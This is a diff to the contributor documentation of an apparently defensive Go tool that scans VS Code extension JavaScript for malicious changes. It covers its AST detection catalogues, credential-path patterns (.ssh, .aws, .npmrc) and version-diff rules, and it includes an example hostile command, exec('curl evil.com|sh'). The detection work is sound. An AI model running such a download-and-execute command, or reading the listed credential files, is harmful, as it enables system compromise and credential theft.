@@ -37,35 +37,104 @@ internal/
   extension/       Extension type + directory-name parsing
   watcher/         fsnotify + debounce
   fetcher/         marketplace API, .vsix download, JS + package.json extraction
-  analyzer/        detection patterns, version diff, scoring
+  analyzer/        version diff, scoring, report model
+  astscanner/      JS AST-based detection engine (replaces regex)
   notifier/        terminal report + desktop notification
 ```
 
-Tests live next to the package they cover. New detection logic should come with
-a test in `internal/analyzer/analyzer_test.go`.
+Tests live next to the package they cover.
+
+## How detection works
+
+Detection is two-pass over the JavaScript AST, using `tdewolff/parse/v2/js`.
+
+**Pass 1 — binding tracker** (`internal/astscanner/scanner.go`)
+
+Collects every `require()` assignment so renamed variables are resolved:
+
+```js
+const cp10 = require('child_process');       // maps cp10 → "child_process"
+const { exec } = require('child_process');   // maps exec → "child_process"
+```
+
+This is why the AST scanner catches bundler-renamed variables that regex misses.
+See `internal/astscanner/ATTACKS.md` for the full list of attack patterns covered.
+
+**Pass 2 — detector**
+
+Walks the AST and checks four node types:
+
+| Node type | What it catches |
+|---|---|
+| `CallExpr` | `cp.exec(...)`, `eval(...)`, `fetch(...)`, `setTimeout("string", ...)` |
+| `NewExpr` | `new Function(...)`, `new WebSocket(...)`, `new XMLHttpRequest()` |
+| `DotExpr` / `IndexExpr` | `process.env`, `process['env']` (bracket notation) |
+| `LiteralExpr` (string) | credential paths: `.ssh`, `.aws`, `.npmrc`, `.kube`, `.docker` |
+
+The detection catalogues live in `internal/astscanner/scanner.go`:
+- `moduleMethodCatalogue` — dangerous methods on known modules
+- `globalCallCatalogue` — dangerous bare function calls
+- `newExprCatalogue` — dangerous constructors
+- `credPathCatalogue` — sensitive path fragments in string literals
+
+### Adding a new pattern
+
+1. Decide which catalogue it belongs to (most new patterns go in `moduleMethodCatalogue`).
+2. Add a row with module, method, display name, and severity.
+3. Add a test in `internal/astscanner/scanner_test.go` (pattern fires) and a negative
+   test (pattern does not fire on benign code).
+4. Add a row to `internal/astscanner/ATTACKS.md`.
+
+Example — detecting `dns.lookup()` as an exfiltration channel:
+
+```go
+{"dns", "lookup", "dns.lookup(", Medium},
+```
+
+## How the diff works
+
+`analyzer.Analyze` runs the AST scanner over the new version and keeps only
+findings absent from the old version. The rule, applied in order:
+
+1. **New file** — file was not in the old version → all its findings are introduced.
+2. **Readable line** (`len(line) ≤ 300 chars`) — the exact trimmed source line is absent
+   from the old corpus → finding is introduced.
+3. **Minified line** (`len(line) > 300 chars`) — exact-text comparison is useless because
+   bundlers reformat and rename variables between versions. Instead, compare the AST
+   *finding signature*: `(pattern, module, first-string-argument)`.
+
+**Why signatures beat text for minified bundles**
+
+A bundler renames `cp` → `a` between versions. After renaming the line text changes,
+but the AST resolves both to the same module. So `a.exec('id')` and `cp.exec('id')`
+both produce signature `("exec(", "child_process", "id")` — same call, not newly introduced.
+A new `exec('curl evil.com|sh')` produces a different signature and is correctly flagged.
+
+**Known diff limitation**
+
+Two calls with identical `(pattern, module, arg)` in a minified file look the same.
+If old code had `exec('build')` and new code adds another `exec('build')`, the second
+call is not flagged. In practice malicious calls use distinct arguments and are caught.
 
 ## Ground rules
 
 - Run `gofmt -w .`, `go vet ./...`, and `go test ./...` before opening a PR.
 - Keep functions small and commented in the existing style (this is a learning
   codebase — clarity over cleverness).
-- New detection patterns: add to the catalogue in `internal/analyzer/analyzer.go`
-  with an honest severity, and add a test case showing it fires (and, ideally,
-  that it doesn't false-positive on benign code).
+- New detection patterns: add to the relevant catalogue in `internal/astscanner/scanner.go`,
+  add a test in `internal/astscanner/scanner_test.go`, and document the attack in
+  `internal/astscanner/ATTACKS.md`.
 
 ## Good first issues
 
 Concrete, self-contained things that would genuinely help:
 
-- **Broaden credential patterns** — detect `.npmrc`, browser "Login Data" paths,
-  and `keychain`/`Credentials` access (currently only `.ssh`/`.aws`/`process.env`).
-- **More network sinks** — `https.get` / `http.request`, raw IP-address literals,
-  and known exfil endpoints (Discord/Telegram webhooks, pastebin).
+- **Broaden credential patterns** — detect browser "Login Data" paths,
+  macOS `keychain`, and Windows `Credentials` store access.
+- **More network sinks** — raw IP-address literals, known exfil endpoints
+  (Discord/Telegram webhooks, pastebin URLs).
 - **Obfuscation heuristic** — flag likely-encoded payloads: `Buffer.from(..., 'base64')`,
-  `atob(`, and long `\x..`/hex string runs. (See the `obfuscated` profile in
-  `simulate.sh` for what currently slips past.)
-- **AST-based detection** — replace substring matching for one pattern (e.g.
-  `child_process` usage) with a real JS parser to cut false positives further.
+  `atob(`, and long `\x..`/hex string runs.
 - **Tests for the fetcher** — feed an in-memory `.vsix` (zip) to the extractor
   and assert the JS map + manifest come out correctly.
 - **Open VSX support** — add the Open VSX registry as a fallback baseline source
